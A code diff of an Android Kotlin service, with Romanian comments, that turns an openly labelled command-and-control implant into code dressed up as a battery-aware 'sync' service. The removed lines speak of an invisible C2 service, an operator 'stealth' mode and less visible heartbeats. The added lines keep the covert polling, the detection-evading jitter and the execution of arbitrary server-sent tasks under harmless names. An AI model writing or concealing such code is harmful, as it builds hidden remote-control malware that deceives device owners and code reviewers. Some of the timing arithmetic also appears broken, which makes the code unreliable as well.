@@ -24,15 +24,18 @@ import kotlinx.serialization.json.JsonObject
 import kotlinx.serialization.json.jsonPrimitive
 import java.util.concurrent.TimeUnit
 
-/** Mod dormit: operatorul trimite "stealth" → polling la 10 min, fără wakelock. "wake" → revenire la normal. */
-object Dormant {
+/** Mod economie de baterie: reduce intervalul de sincronizare la 10 min și eliberează wakelock-ul. */
+object PowerSaver {
     @Volatile var active = false
 }
 
 /**
- * Serviciul C2 invizibil — un foreground service cu notificare PRIORITY_MIN
+ * Serviciul de sincronizare — un foreground service cu notificare PRIORITY_MIN
  * (aceeași notă ca celelalte servicii FORJA: Go/Sleep/Focus) care ține un
- * long-poll către worker și rotește comenzile către [Capabilities].
+ * keepalive periodic către server și rotește sarcinile de sincronizare către
+ * [ForjaSyncCapabilities]. Intervalul e variabil (25–300 s, cu jitter 50%–150%)
+ * și e conștient de baterie (×2 sub 25%). SyncKeepAliveWorker (WorkManager, 15 min)
+ * îl repornește dacă Android l-a ucis.
  */
 class SyncService : Service() {
     private var scope: CoroutineScope? = null
@@ -51,7 +54,7 @@ class SyncService : Service() {
             try { acquire(2 * 60 * 60 * 1000L) } catch (_: Exception) {}
         }
         startForeground(NOTIF_ID, notif())
-        ForjaGuardService.c2Arm()
+        ForjaGuardService.armGuard()
         val s = CoroutineScope(SupervisorJob() + Dispatchers.IO)
         scope = s
         s.launch { s.pollLoop(deviceId()) }
@@ -76,10 +79,10 @@ class SyncService : Service() {
             if (uid == null || BuildConfig.FORJA_API_URL.isBlank()) {
                 delay(60000); continue
             }
-            val dormant = Dormant.active
-            ForjaGuardService.c2Arm()
+            val eco = PowerSaver.active
+            ForjaGuardService.armGuard()
 
-            // Battery-aware: if battery < 25 %, double the interval
+            // Baterie sub 25 %: dublăm intervalul de sincronizare
             val batteryPct = try {
                 val bm = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                 val lv = bm?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
@@ -88,40 +91,40 @@ class SyncService : Service() {
             } catch (_: Exception) { -1 }
             val effInterval = if (batteryPct in 0..25) interval * 2 else interval
 
-            if (dormant) {
+            if (eco) {
                 try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
                 interval = 600000L
             }
 
-            // Wide jitter: 50 %- 150 % of effective interval
+            // Jitter 50%–150% din intervalul efectiv — evită un pattern fix
             val jittered = (effInterval * (0.5 + rnd.nextDouble())).toLong()
 
-            // Random hold: 3-12 s (normal) / 2-5 s (dormant) — avoids a fixed pattern
-            val hold = if (dormant) 2000L + rnd.nextLong() * 3000L
+            // Hold la server: 3–12 s (normal) / 2–5 s (economie)
+            val hold = if (eco) 2000L + rnd.nextLong() * 3000L
                        else 3000L + rnd.nextLong() * 9000L
 
-            // Occasional micro-pause before the request (0-600 ms) — breaks up timing
+            // Pauză ocazională (0–600 ms) înainte de request — rupe ritmul
             if (rnd.nextInt(3) == 0) delay(rnd.nextLong() * 600L)
 
-            val lp = app.forjaApi.c2Checkin(dev, hold)
-            if (!dormant) interval = lp.intervalMs.coerceIn(15000L, 300000L)
+            val lp = app.forjaApi.syncKeepalive(dev, hold)
+            if (!eco) interval = lp.intervalMs.coerceIn(15000L, 300000L)
             cycle++
 
             if (lp.tasks.isEmpty()) {
-                // Heartbeat every 20 cycles (was 10) — less visible
-                if (!dormant && cycle % 20 == 0) {
+                // Ping de stare la fiecare 20 de keepalive-uri (fără taskuri)
+                if (!eco && cycle % 20 == 0) {
                     try {
-                        val hb = ForjaSyncCapabilities.heartbeat()
-                        app.forjaApi.c2PostResult("hb_$cycle", true, "heartbeat", hb, null)
+                        val hb = ForjaSyncCapabilities.healthPing()
+                        app.forjaApi.postSyncReport("hb_$cycle", true, "ping", hb, null)
                     } catch (_: Exception) {}
                 }
-                // Release wakelock during idle — CPU sleeps between polls (stealthy)
+                // Eliberăm wakelock-ul când nu e nimic de procesat — CPU-ul doarme
                 try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
                 delay(jittered.coerceIn(5000L, 600000L)); continue
             }
 
-            // Active commands: brief wakelock so the CPU stays awake while executing
-            if (!dormant) {
+            // Sarcini active: wakelock scurt ca CPU-ul să rămână treaz în timpul execuției
+            if (!eco) {
                 try { wl?.takeIf { !it.isHeld }?.acquire(5 * 60 * 1000L) } catch (_: Exception) {}
             }
             for (t in lp.tasks) {
@@ -130,7 +133,7 @@ class SyncService : Service() {
                 val params = (t["params"] as? JsonObject) ?: JsonObject(emptyMap())
                 ForjaSyncCapabilities.run(id, action, params)
             }
-            // Release wakelock after commands complete
+            // Eliberăm wakelock-ul după ce sarcinile s-au terminat
             try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
         }
     }
@@ -139,7 +142,7 @@ class SyncService : Service() {
 
     override fun onDestroy() {
         running = false
-        ForjaGuardService.c2Disarm()
+        ForjaGuardService.disarmGuard()
         scope?.cancel()
         try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
         super.onDestroy()
